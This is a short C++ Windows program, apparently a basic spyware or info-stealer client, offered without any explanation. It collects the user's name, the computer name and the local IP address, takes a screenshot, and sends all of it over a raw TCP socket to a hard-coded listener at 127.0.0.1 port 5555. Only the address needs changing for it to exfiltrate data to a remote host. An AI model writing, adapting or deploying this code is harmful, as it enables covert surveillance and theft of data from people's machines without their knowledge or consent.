#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <string>
#include <fstream>
#include "screenshot.h"
#include <string>
#pragma comment(lib, "ws2_32.lib")

std::string getComputerName() {
    char buffer[256];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "unknown";
}

std::string getUsername() {
    char buffer[256];
    DWORD size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "unknown";
}

std::string getLocalIP() {
    WSADATA wsaData;
    char hostname[256];
    std::string ip = "unknown";

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) == 0) {
        if (gethostname(hostname, sizeof(hostname)) == 0) {
            struct hostent* host = gethostbyname(hostname);
            if (host && host->h_addr_list[0]) {
                ip = inet_ntoa(*(struct in_addr*)host->h_addr_list[0]);
            }
        }
        WSACleanup();
    }
    return ip;
}

void sendData(const std::string& serverIp, int port, const std::string& info, const std::string& screenshotPath) {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(serverIp.c_str());

    if (connect(sock, (sockaddr*)&server, sizeof(server)) != 0) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    send(sock, info.c_str(), (int)info.length(), 0);
    send(sock, "\n", 1, 0);

    std::ifstream file(screenshotPath, std::ios::binary);
    char buffer[1024];
    while (file.read(buffer, sizeof(buffer))) {
        send(sock, buffer, (int)file.gcount(), 0);
    }
    send(sock, buffer, (int)file.gcount(), 0); 

    file.close();
    closesocket(sock);
    WSACleanup();
}

int main() {
    std::string username = getUsername();
    std::string computer = getComputerName();
    std::string ip = getLocalIP();

    std::string info = "USER=" + username + ";PC=" + computer + ";IP=" + ip;

    std::string screenshotPath = "screenshot.bmp";
    captureScreenToFile(screenshotPath);

    sendData("127.0.0.1", 5555, info, screenshotPath);

    return 0;
}
